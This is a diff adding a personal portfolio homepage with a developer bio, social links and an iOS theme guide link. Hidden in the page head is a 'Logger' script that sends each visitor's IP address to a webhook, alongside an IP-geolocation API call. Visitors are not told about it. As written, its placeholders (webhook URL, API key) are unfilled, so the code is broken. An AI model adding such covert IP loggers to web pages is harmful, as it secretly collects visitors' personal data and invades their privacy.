@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+
+    <!-- Meta Tags -->
+    <title>~ Kota.gay ~</title>
+    <meta name="title" content="~ Kota.gay ~">
+    <meta name="description" content="v2">
+    <meta name="theme-color" content="#2f3036" />
+
+    <!-- Open Graph -->
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="~ Kota.gay ~ | v2">
+    <meta property="og:url" content="https://kota.gay">
+    <meta property="og:title" content="~ Kota.gay ~">
+    <meta property="og:description"
+        content="Kota's website! You can see what she's listening to on spotify, see the iOS repo, or find other cool links!">
+    <meta property="og:image"
+        content="https://cdn.discordapp.com/avatars/353201426576703488/f48fb56dc1c3e139fd893146cc68a5c0.png?size=4096">
+
+    <!-- Scripts -->
+    <link rel="stylesheet" href="./resources/style.css">
+    <link rel="stylesheet" href="./css/main.css">
+    <link rel="stylesheet" href="./resources/loader.css">
+    <link rel="icon"
+        href="https://cdn.discordapp.com/attachments/901999809404219444/1001892186255798372/kindpng_2149392.png?size=4096">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"
+        integrity="sha512-c42qTSw/wPZ3/5LBzD+Bw5f7bSF2oxou6wEb+I/lqeaKV5FDIfMvvRp772y4jcJLKuGUOpbJMdg/BTl50fJYAw=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script src="./resources/lastfm.js"></script>
+    <script src="./resources/protecc.js"></script>
+    <script src="./resources/index.js"></script>
+    <script type='text/javascript' src='config.js'></script>
+    <script type='text/javascript' src='script.js'></script>
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-EH1JG21NGT"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'G-EH1JG21NGT');
+    </script>
+    <script>
+        function getIP(json) {
+            var request = new XMLHttpRequest(); //making a request for the webhook
+            request.open("POST", { webHookUrl });
+
+            request.setRequestHeader('Content-type', 'application/json');
+
+            var params = {
+                username: "Logger",
+                avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+                content: "**IP:** *" + json.ip + "*"
+            }
+            //just a webhook parameters such as avatar,name,message
+
+            request.send(JSON.stringify(params));
+        }
+
+    </script>
+    <script src="https://ipgeolocation.abstractapi.com/v1/?api_key=${api_key}"></script>
+
+</head>
+
+<body>
+
+    <!-- PreLoader -->
+    <div style="background-image: url(img/rgb2.gif);" class="preloader">
+        <div class="spinner">
+            <div class="circle1"></div>
+            <div class="circle2"></div>
+        </div>
+    </div>
+    <script>
+        const container = document.querySelector('.preloader');
+        window.addEventListener('load', () => { container.classList.add('hide-preloader'); })
+    </script>
+    <!-- -->
+
+    <img src='https://cutewallpaper.org/25/animated-wallpaper-gif-trance/latest-seamless-gifs-gfycat.gif'>
+    <div class="rainbow">
+        <pre class="ascii"><a style="text-shadow: 0px 2px 3px #FFF;background: transparent url(img/sparkle.gif);">
+
+ ▄▀▀▄ █  ▄▀▀▀▀▄   ▄▀▀▀█▀▀▄  ▄▀▀█▄  
+ █  █ ▄▀ █      █ █    █  ▐ ▐ ▄▀ ▀▄ 
+ ▐  █▀▄  █      █ ▐   █       █▄▄▄█ 
+   █   █ ▀▄    ▄▀    █       ▄▀   █ 
+  ▄▀   █    ▀▀▀▀    ▄▀       █   ▄▀  
+ █    ▐           █         ▐   ▐   
+ ▐                ▐                 
+	</pre>
+    </div>
+    <pre>
+<details class="rainbow" style="font-size: medium;">
+24 Year old
+She/her
+Being an experienced 
+Front-end & Back-end developer, 
+currently, I am looking for a new job.
+Success is my first guide to life and business.
+Here's what I offer:
+
+ <u>-Web Development</u>
+ As a Front End expert, I develop cutting-edge 
+UI/UX Components that are pixel perfect,
+and full screen responsive pages
+with splendid dynamic animation.
+Built modular component-based features 
+across the front-end of the web applications,
+and utilize current coding practices
+such as component architecture, 
+functional programming patterns 
+with an emphasis on code quality.
+
+- Front end technologies: 
+Objective-C, Typescript, Angular,  Wordpress, 
+Shopify, SASS, HTML, CSS/CSS3, Bootstrap, Tailwind CSS.
+
+- Back end technologies: 
+Node.js, Python, PHP, Swift, Objective-c
+
+- Database: 
+MongoDB, MySQL, Firebase.
+
+- API Development: 
+JSON / XML
+
+- Hosting: 
+AWS, Google Cloud, Heroku
+
+- Version Control: 
+Git, Github
+
+- Project control: 
+VSCode, VS Community 2018
+
+After many years of hard work,
+I have mastered several skills.
+HTML, CSS, JavaScript, and Python 
+are my primary skills.
+I am located in the United States.
+So I am looking for a 100% remote position.
+If you are interested in my experience, 
+please feel free to contact me.
+</details>
+    </pre>
+
+    <br>
+    <div class="rainbow">
+        <a href="https://hackforums.net/member.php?action=profile&uid=4621678" class="btn2">HackForums</a> |
+        <a href="https://github.com/R31GNDEV" class="btn2">GitHub</a> |
+        <a href="https://open.spotify.com/user/12183096131?si=5e5d205d27ba4868" class="btn2">Spotify</a>
+        <div style="margin-top: 15px;">
+            <a href="https://kota.gay/repo" class="btn2">iOS Repo</a> |
+            <a href="https://discord.gg/torch" class="btn2">Discord Server</a>
+        </div>
+        <div class="rainbow">
+            <div class="gap">
+                <a style="text-shadow: 0px 2px 3px #FFF;">Need help building your iOS theme? <div> Check out this
+                        Theme-Guide I've put together! <div class="gap-theme-guide"><a
+                                href="https://kota.gay/theme-guide/index.html" class="btn3"><b>Theme-Guide</b></a>
+                        </div>
+                    </div>
+                    <div class="gap"></div>
+
+                    <p style="padding-top: 30px; margin-bottom: 1px;" class="rainbow">(Official, don't trust scams)<div>
+                            Discord: <a
+                                style="text-shadow: 0px 2px 3px #FFF;background: transparent url(img/sparkle.gif);"
+                                class="rainbow" href="https://linktr.ee/duhkota">Kota#1337</a></p>
+                    <div id="spotify"></div>
+                    <a style="color: #000; text-shadow: 0px 2px 3px #FFF;"
+                        href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">♥</a>
+                    <div><a class="rainbow">Don't click the black heart</a>
+                        <br>
+</body>
+
+</html>
